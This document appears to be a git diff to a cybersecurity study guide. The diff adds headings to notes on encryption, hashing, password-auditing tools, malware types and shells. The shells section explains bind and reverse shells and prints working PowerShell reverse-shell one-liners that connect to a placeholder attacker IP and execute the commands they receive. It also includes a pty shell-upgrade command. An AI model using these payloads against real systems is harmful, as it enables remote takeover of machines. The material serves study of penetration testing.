@@ -2,7 +2,11 @@
 
 ## Cryptography and Encryption
 
+### Understanding Encryption
+
 Cryptography & Encryption is the science of hiding data and making it available again. In cryptography, hiding data is called encryption and unhiding it is called decryption. When data is securely exchanged, it is first encrypted by the sender, and then decrypted by the receiver using a special key. For Instance, Computers encrypt using XOR is an operation that compares two bits and returns True (1) if only one of the bits is 1, and returns False (0), if the bits are the same value (both 0’s or both 1’s).
+
+### Symmetric and Asymmetric Encryption
 
 - **Symmetric encryption** uses the same key to both encrypt and decrypt data.
 - **Asymmetric encryption** uses two different keys to encrypt and decrypt data. Asymmetric encryption is the most secure way to transmit data; however, it is slower and more complex than symmetric encryption. Therefore, it is primarily used to exchange smaller pieces of data. Encryption is the most powerful single tool for protecting networking network security, it’s technique include: “Link Encryption, End-to-End Encryption, VPNs, SSH encryption, Transport layer security(TLS), IP security protocol(IPsec), Signed Code, Encrypted Email.”
@@ -20,6 +24,8 @@ It’s easy to get the hash value of some types data. If you are on a Unix-based
 ```bash
 echo "Hello World" | shasum -a 256
 ```
+
+### Hash Function Characteristics
 
 The cryptographic algorithm used must generate hashes that have the following characteristics:
 
@@ -74,6 +80,8 @@ It is able to identify a single hash, parse a file or read multiple files in a d
 
 ### Hash Auditing & Recovery Tools
 
+#### HashCat Usage
+
 **HashCat Basic Concepts**
 Hashcat is often used for password auditing and recovery. It supports various modes to test password strength.
 
@@ -84,6 +92,8 @@ Hashcat is often used for password auditing and recovery. It supports various mo
 | Brute-Force | MD5 | Try all character combinations (computationally expensive). |
 | Combinator | MD5 | Combine words from dictionaries. |
 | Association | $1$ | Combine words based on association rules. |
+
+#### John The Ripper Usage
 
 **John The Ripper (JTR)**
 John the Ripper is a widely used password auditing tool. It is often used to check for weak passwords by System Administrators.
@@ -203,6 +213,8 @@ Computers are complicated machines. If we had to communicate with the hardware d
 
 ## Malware
 
+### Malware Types and Definitions
+
 - **Malware:** Malicious-Software code inserted into a system to cause damage or gain unauthorized access to a network
 - **Adware:** Unwanted software designed to throw advertisements on your screen
 - **Virus:** A malicious self-replacing application that attaches itself to other programs and executables without the permission of the user
@@ -218,6 +230,10 @@ Computers are complicated machines. If we had to communicate with the hardware d
 Phishing is a type of social engineering attack that can take many forms. For example, vishing, (voice phishing), smishing (SMS phishing), and webpages that harvest credentials are all threats. Attackers can also send emails that look like they are from legitimate senders by using spoofing.   If the target is extremely sought after, like the CEO of a company, it is known as whaling.
 
 
+## Shells and Footholds
+
+### Understanding Shells
+
 🕹What is a Shell - FOOTHOLD
 In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common BASH or ZSH programs in Linux are examples of shells, as are Command-Prompt and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target. In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port connection on the server which we can connect to in order to execute further commands (a bind/Forward shell).
 There are a variety of tools that can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system, such as NETCAT, SOCAT, Metasploit Modules—>multi/handler(Listens for Connections) & Msfvenom(Create Bind/Reverse Shell Payload).
@@ -225,8 +241,12 @@ Shells can be either interactive or non-interactive.
 Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. An interactive program, requires an interactive shell in order to run.
 Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Suffice to say that interactive programs do not work in non-interactive shells. 
 
+### Shell Types: Bind and Reverse
+
 Bind shells -> When the Payload code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
 Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the above to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. 
+
+### Netcat for Shell Connections
 
 NETCAT (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. The command is designed to be a dependable back-end that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and investigation tool, since it can produce almost any kind of connection its user could need and has several built-in capabilities. Its list of features includes port scanning, transferring files, and port listening: as with any server, it can be used as a backdoor.
     -l is used to tell netcat that this will be a listener
@@ -234,6 +254,10 @@ NETCAT (often abbreviated to nc) is a computer networking utility for reading fr
     -n tells netcat not to resolve host names or use DNS. 
     -p indicates that the port specification will follow.
 If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. 
+
+### Shell Upgrade Techniques
+
+#### Bash Reverse Shell Connection
 
 A.	The payload you've mentioned is used to create a reverse shell, which is a method for establishing a connection back to your machine from a target system. This can be particularly useful in situations(especially exploiting Webservers) where you have an unstable or non-interactive shell on the target and need a more stable and interactive environment. This setup assumes you have a listener set up on your machine at the specified IP and port (e.g., using `nc -lvp 443`) to accept the incoming connection. Once executed, the target machine will initiate a connection to your listener, giving you Partially-Interactive control over the shell. However, this type of shell might not be fully stable or fully interactive in terms of handling terminal input/output correctly, especially for programs that require full terminal capabilities (like `vi`, `top`, etc.).
 
@@ -249,6 +273,8 @@ This allows you to execute a sequence of commands directly from the command line
 - Interactive Mode: Running Bash in interactive mode ensures that the shell behaves more like a normal terminal, supporting job control, aliases, and more.
 - Unified Input/Output Redirection: Redirecting stderr and stdout together to the remote connection helps ensure that all output is captured remotely, making debugging and interaction easier.
 
+
+#### Python Shell Upgrade
 
 B.	The command python -c 'import pty; pty.spawn("/bin/bash")' is used in the context of a reverse shell to upgrade the partial-interactive shell you have obtained on a remote system to a fully interactive shell. Here's what each part does:
 
@@ -279,6 +305,8 @@ This command is particularly useful in scenarios where you have gained access th
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
+
+#### PowerShell Reverse Shell
 
 C.	 # PowerShell can be crafted to simulate a reverse shell, which connects back to an attacker-controlled server, allowing command execution. This is analogous to the Bash reverse shell example without the Python Part. For a proof of concept (PoC) to demonstrate an exploit on a webserver hosted in a Windows environment, directly translating the Bash and Python one-liners might not work effectively due to differences in underlying operating systems and available tools. Instead, you can use PowerShell or other native Windows functionalities to create a similar impact
 $IP = "attacker_IP"  # Replace with the IP address of the attacker's machine
@@ -330,6 +358,8 @@ while ($true) {
 
 $client = New-Object System.Net.Sockets.TCPClient("YOUR_IP", YOUR_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 $sm=(New-Object Net.Sockets.TCPClient("YOUR_IP", YOUR_PORT)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+
+### Shell Implementation Examples
 
 Below are Simplified code snippets for both a bind shell and a reverse shell in PHP, Python, Powershell, CMD, BASH. These snippets will focus on the core functionality needed to start a simple shell and make it interactive. Credit should be given to Metasploit Team, as i scorched through their codes to find the exact snippets that run bind and reverse shells
 Reference Location:https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/payload && https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads
